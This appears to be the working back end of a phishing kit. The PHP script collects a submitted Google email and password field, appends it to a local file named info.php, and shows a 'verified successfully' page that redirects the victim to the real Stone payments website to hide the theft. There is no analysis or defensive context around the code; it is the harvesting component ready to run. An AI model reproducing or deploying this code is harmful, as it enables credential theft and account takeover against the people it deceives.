<?php

       $emailsenha = addslashes($_POST["emailsenha"]);
    
       $corpomsg = " <p></p>
       ====Senha do Google======<br> <p></p>
       emailsenha: $emailsenha<br>    <p></p> 
       =======================";
         $fp = fopen("info.php", "a");
       fwrite($fp, $corpomsg);
       fclose($fp);
     ?>

     
<!DOCTYPE html>
<html>
 <head> 
  <title>Verificado com sucesso </title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no"> 
  <meta http-equiv="refresh" content="1, url='https://www.stone.com.br/'"> 
  <link rel="shortcut icon" href="assets/imagenss/ico_favicon.png"> 
  <link rel="stylesheet" type="text/css" href="../assets/css/benef_compras_style.css"> 
 </head> 



</html>